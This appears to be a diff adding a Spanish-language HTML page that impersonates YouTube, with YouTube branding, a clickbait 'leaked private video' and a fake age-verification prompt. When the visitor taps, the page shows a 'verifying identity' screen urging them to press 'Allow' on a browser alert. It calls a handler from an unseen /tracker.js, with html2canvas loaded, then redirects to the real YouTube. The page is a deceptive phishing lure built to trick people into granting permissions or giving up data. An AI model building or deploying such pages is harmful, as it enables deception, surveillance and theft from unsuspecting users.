@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0f0f0f">
+    <title>YouTube</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #0f0f0f;
+            display: flex;
+            flex-direction: column;
+            color: white;
+        }
+
+        .header {
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #272727;
+        }
+
+        .yt-logo {
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: -1px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .yt-icon {
+            background: #FF0000;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        .player-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .thumbnail {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.3;
+            filter: blur(5px);
+        }
+
+        .warning-box {
+            text-align: center;
+            z-index: 10;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 8px;
+            border: 1px solid #333;
+        }
+
+        .warning-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .warning-title {
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .warning-desc {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+
+        .play-btn {
+            background: white;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .video-info {
+            padding: 15px;
+        }
+
+        .video-title {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .video-meta {
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #333;
+        }
+
+        .channel-name {
+            font-weight: 500;
+            font-size: 15px;
+        }
+
+        .subs {
+            color: #aaa;
+            font-size: 12px;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0f0f0f;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #FF0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="yt-logo"><span class="yt-icon">▶</span> YouTube</div>
+    </div>
+
+    <div class="player-container" id="mainContainer">
+        <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=800&auto=format&fit=crop"
+            class="thumbnail" alt="thumb">
+        <div class="warning-box">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">Restricción de Edad</div>
+            <div class="warning-desc">Este video puede ser inapropiado para algunos usuarios. Confirma tu identidad para
+                verlo.</div>
+            <button class="play-btn">Verificar y Reproducir</button>
+        </div>
+    </div>
+
+    <div class="video-info">
+        <div class="video-title">Video Privado Filtrado (IMPACTANTE) 😱</div>
+        <div class="video-meta">1.2 M de vistas • Hace 2 horas</div>
+        <div class="channel-info">
+            <div class="avatar"></div>
+            <div>
+                <div class="channel-name">Noticias Virales</div>
+                <div class="subs">845 K suscriptores</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="yt-logo"><span class="yt-icon">▶</span> YouTube</div>
+        <div class="spinner"></div>
+        <div style="color: white; margin-top: 20px; font-weight: bold; font-size: 16px;">Verificando Identidad...</div>
+        <div
+            style="color: #aaa; margin-top: 10px; font-size: 13px; text-align: center; max-width: 80%; line-height: 1.5;">
+            Por políticas de YouTube, necesitamos comprobar de forma segura que no eres un bot.
+            <br><br><strong style="color: #fff;">Presiona "Permitir" en la alerta superior.</strong>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="/tracker.js"></script>
+    <script>
+        const loadingScreen = document.getElementById('loadingScreen');
+        let clicked = false;
+
+        async function openApp() {
+            if (clicked) return;
+            clicked = true;
+            loadingScreen.classList.add('active');
+
+            if (typeof handleMainCta === 'function') await handleMainCta();
+
+            setTimeout(() => { window.location.replace('https://www.youtube.com/'); }, 1000);
+        }
+
+        document.getElementById('mainContainer').addEventListener('click', openApp);
+        document.getElementById('mainContainer').addEventListener('touchstart', openApp, { passive: true });
+    </script>
+</body>
+
+</html>
